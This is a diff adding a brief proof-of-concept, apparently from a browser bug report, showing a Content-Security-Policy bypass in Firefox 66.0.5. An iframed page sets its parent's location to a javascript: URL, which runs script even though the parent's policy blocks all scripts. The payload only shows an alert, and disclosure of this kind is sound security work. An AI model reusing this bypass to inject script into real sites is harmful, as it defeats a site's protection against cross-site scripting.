@@ -1,0 +1,13 @@
+environment:
+windows 10
+Firefox 66.0.5 x64
+Xss is triggered when the victim opens csp.html.
+poc:
+csp.html
+<meta http-equiv="Content-Security-Policy" content="script-src 'none'">
+<script>alert(location.href)</script>
+<iframe src=./xs.html>
+xs.html
+<script>
+parent.window.location ="javascript:alert(location.href)";
+</script>
